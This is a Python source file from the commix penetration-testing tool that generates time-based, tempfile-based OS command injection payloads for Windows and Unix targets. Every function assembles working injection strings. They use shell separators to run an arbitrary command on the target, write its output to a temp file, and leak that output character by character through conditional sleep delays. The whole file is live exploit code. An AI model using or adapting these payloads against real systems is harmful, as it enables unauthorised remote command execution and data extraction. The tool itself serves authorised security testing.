#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import urllib
from src.utils import settings

"""
The "tempfile-based" technique on Semiblind OS Command Injection.
The available "tempfile-based" payloads.
"""

"""
Tempfile-based decision payload (check if host is vulnerable).
"""
def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " " +
                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
                "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                " do if %i==" +str(j) + " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
                "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                )

    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " + 
                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + " "
                "for /f \"delims=\" %i in (' cmd /c \"powershell.exe "
                "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                " do if %i==" +str(j) + " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
                "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                )

  else:
    if separator == ";" :
      payload = (separator + " "
                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
                # Find the length of the output.
                "str1=${#str}" + separator + " "
                "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
                "then sleep 0" + separator + " "
                "else sleep " + str(delay) + separator + " "
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
                # Find the length of the output.
                "str1=${#str}" + separator + " "
                "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
                "then sleep 0" + separator + " "
                "else sleep " + str(delay) + separator + " "
                "fi "
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "sleep 0 " + separator + " "
                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ") " + separator + " "
                "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator + " "
                "str1=${#str} " + separator + " "
                "[ " + str(j) + " -eq ${str1} ] " + separator + " "
                "sleep " + str(delay) + " "
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      payload = ("| " + 
                "echo " + TAG + " > " + OUTPUT_TEXTFILE + " | " + 
                "[ " + str(j) + " -ne $(cat " +OUTPUT_TEXTFILE+ " | tr -d '\\n' | wc -c) ] " + separator + " "
                "sleep " + str(delay) + " "
                )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " "
                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
                "for /f \"delims=\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" +str(j) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " + 
                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + " "
                "for /f \"delims=\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" +str(j) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
  else:  
    if separator == ";" :
      payload = (separator + " "
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator + " "
                "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator + " "
                "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = urllib.quote("&")
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "$(python -c \"import time\ntime.sleep(0)\") " + separator + " "
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator + " "
                "[ " + str(j) + " -eq ${str1} ] " + separator + " "
                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\") "
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      payload = ("| " +
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + " "
                # Find the length of the output, using readline().
                "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
                "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep(" + str(delay) + ")\") "
                ) 
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
      payload = payload.replace("\n", ";")
      
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " " +
                cmd + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                " do if %i==" +str(j) + " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + " " +
                # Transform to ASCII
                pipe + " "
                "powershell.exe write-host ([int[]][char[]]([string](cmd /c " + cmd + "))) > " + OUTPUT_TEXTFILE + "\") "
                "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                )
    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                cmd + ">" + OUTPUT_TEXTFILE + " " + ampersand + " "
                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                " do if %i==" +str(j) + " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + " " +
                # Transform to ASCII
                ampersand + " "
                "powershell.exe write-host ([int[]][char[]]([string](cmd /c " + cmd + "))) > " + OUTPUT_TEXTFILE + "\") "
                "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                )

  else:
    if separator == ";" :
      payload = (separator + " "
                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                "echo $str > " + OUTPUT_TEXTFILE + separator + 
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
                # Find the length of the output.
                "str1=${#str}" + separator + " "
                "if [ " + str(j) + " != ${str1} ]" + separator + " "
                "then sleep 0 " + separator + " "
                "else sleep " + str(delay) + separator +
                # Transform to ASCII
                "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator + 
                "echo $str1 > " + OUTPUT_TEXTFILE + separator + 
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                "echo $str > " + OUTPUT_TEXTFILE + separator + 
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
                # Find the length of the output.
                "str1=${#str}" + separator + " "
                "if [ " + str(j) + " != ${str1} ]" + separator + " "
                "then sleep 0 " + separator + " "
                "else sleep " + str(delay) + separator + " "
                # Transform to ASCII
                "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator + 
                "echo $str1 > " + OUTPUT_TEXTFILE + separator + 
                "fi "
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "sleep 0 " + separator + " "
                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                "echo $str > " + OUTPUT_TEXTFILE + separator + 
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
                # Find the length of the output.
                "str1=${#str} " + separator + " "
                "[ " + str(j) + " -eq ${str1} ]" + separator + " "
                "sleep " + str(delay) + separator +  " "
                # Transform to ASCII
                "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator + 
                "echo $str1 > " + OUTPUT_TEXTFILE 
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)
      
    elif separator == "||" :                
      payload = ("| " + 
                "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | " + 
                "[ " + str(j) + " -ne $(cat " +OUTPUT_TEXTFILE+ " | tr -d '\\n' | wc -c) ] " + separator + " "
                "sleep " + str(delay) + " "
                )                    
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " " +
                cmd + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
                "for /f \"delims=\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" +str(j) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                cmd + ">" + OUTPUT_TEXTFILE + " " + ampersand + " "
                "for /f \"delims=\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" +str(j) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
  else: 
    if separator == ";" :
      payload = (separator + " "
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator + " "
                "if [ " + str(j) + " != ${str1} ] " + separator +
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + separator + " "
                "if [ " + str(j) + " != ${str1} ] " + separator +
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                )    

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" +  separator + " "
                # Find the length of the output, using readline().
                "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  separator + " "
                "[ " + str(j) + " -eq ${str1} ] " +  separator + " "
                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\") "
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator) 

    elif separator == "||" :     
      payload = ("| " + 
                "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + " "
                "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
                "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
                )                   
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
      payload = payload.replace("\n", ";")

  return payload

"""
Get the execution output, of shell execution.
"""
def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " " +
                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                " do if %i==" +str(ascii_char)+ " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + "\")"
                )

    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " + 
                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                " do if %i==" +str(ascii_char)+ " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + "\")"
                )

  else:
    if separator == ";" :
      payload = (separator + " " +
                # Use space as delimiter
                "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
                "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(delay) + separator +
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                # Use space as delimiter
                "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
                "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(delay) + separator +
                "fi "
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "sleep 0 " +  separator + " "
                # Use space as delimiter
                "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
                "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
                "sleep " + str(delay) + " "
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)
        
    elif separator == "||" :
      payload = ("| " + 
                "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
                "sleep " + str(delay) + " "
                )
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print ord(file.read().strip()[" + str(num_of_chars - 1) + "][0]); exit(0)\""
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " "
                "for /f \"delims=\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " 
                "for /f \"delims=\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" + str(ascii_char) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
  else: 
    if separator == ";" :
      payload = (separator + " "
                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                ) 

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") " +  separator + " "
                "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      payload = ("| " + 
                "[ " + str(ascii_char) + " -ne  $(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") ] " + separator + 
                "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
                )
    else:
      pass

    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
      payload = payload.replace("\n", ";")

  return payload

"""
Get the execution output, of shell execution.
"""
def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " "
                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                "do if %i==" + str(ord(str(ascii_char))) + " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
                "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                )

    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " 
                "for /f \"delims=\" %i in (' cmd /c \"powershell.exe "
                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                "do if %i==" + str(ord(str(ascii_char))) + " "
                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
                "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                )

  else:  
    if separator == ";" :
      payload = (separator + " "
                "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator + " "
                "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator + " "
                "then sleep 0" + separator + " "
                "else sleep " + str(delay) + separator + " "
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator + " "
                "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator + " "
                "then sleep 0" + separator + " "
                "else sleep " + str(delay) + separator + " "
                "fi "
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "sleep 0 " +  separator + " "
                "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ") " + separator + " "
                "[ " + str(ord(str(ascii_char))) + " -eq ${str} ] " +  separator + " "
                "sleep " + str(delay) + " "
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)
        
    elif separator == "||" :
      payload = ("| " +
                "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + ") ] " + separator + 
                "sleep " + str(delay) + " "
                )
    else:
      pass
  
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print file.readlines()[0][" + str(num_of_chars - 1) + "]; exit(0)\""
    if separator == "||" :
      pipe = "|"
      payload = (pipe + " "
                "for /f \"delims=\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " 
                "for /f \"delims=\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" + str(ascii_char) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
                )
  else: 
    if separator == ";" :
      payload = (separator + " "
                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\")" + separator + " "
                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + " "
                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\")" + separator + " "
                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                "then $(python -c \"import time\ntime.sleep(0)\")" + separator + " "
                "else $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")" + separator + " "
                "fi "
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " " +
                "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
                "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\") " +  separator + " "
                "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
                "$(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      payload = ("| " +
                "[ " + str(ascii_char) + " -ne  $(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\") ] " + separator + 
                "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep(" + str(delay) + ")\")"
                )
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
      payload = payload.replace("\n",";")

  return payload
  
# eof